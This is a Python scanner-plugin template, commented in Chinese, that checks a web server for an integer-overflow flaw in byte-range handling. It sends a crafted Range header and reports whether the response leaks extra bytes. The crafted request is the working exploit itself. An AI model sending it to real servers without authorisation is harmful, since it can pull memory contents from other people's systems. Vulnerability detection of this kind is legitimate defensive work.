
# 自定义POC检测脚本模板
# 模块导入
from typing import Optional
#!/usr/bin/env python
import requests

def poc(url):
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
    }
    offset = 605
    file_len = len(requests.get(url, headers=headers).content)
    n = file_len + offset
    headers['Range'] = "bytes=-%d,-%d" % (
        n, 0x8000000000000000 - n)
    r = len(requests.get(url, headers=headers).content)
    if r > file_len:
        return True
    return False
# 主方法
def vulnerability_check(url: Optional[str],
                )->bool:
    """
    用于被扫描器调用的主方法
    Args:
        url: 由扫描器传入的目标地址
    Return:
        返回True(存在漏洞)或者False(不存在漏洞)
    """
    # TODO:下面写你的检测漏洞脚本，存在返回True不存在返回False
    return poc(url)
